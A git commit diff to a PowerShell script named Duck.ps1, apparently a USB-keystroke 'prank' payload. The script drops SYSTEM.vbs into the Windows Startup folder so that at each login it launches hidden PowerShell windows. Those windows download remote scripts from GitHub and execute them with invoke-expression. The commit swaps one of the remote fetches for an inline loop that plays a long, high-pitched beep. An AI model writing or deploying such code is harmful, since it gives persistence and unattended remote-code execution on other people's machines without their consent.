65dd43dae52ea7192562e5ac495a1046e0727558
Falcon <101268424+Falconnix@users.noreply.github.com>
2023-05-02 10:23:58 -0400

    Update Duck.ps1

--- Duck.ps1
+++ Duck.ps1
@@ -2,5 +2,5 @@ Start-Sleep -Seconds 1
 cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
 New-Item 'SYSTEM.vbs' -ItemType File
 Start-Sleep -Seconds 1
-$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/beep.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs
+$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h  $BeepList = @(@{ Pitch = 32767; Length = 900000; };);foreach ($Beep in $BeepList) {[System.Console]::Beep($Beep[''Pitch''], $Beep[''Length'']);}")' | out-file -filepath SYSTEM.vbs
 $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds 2
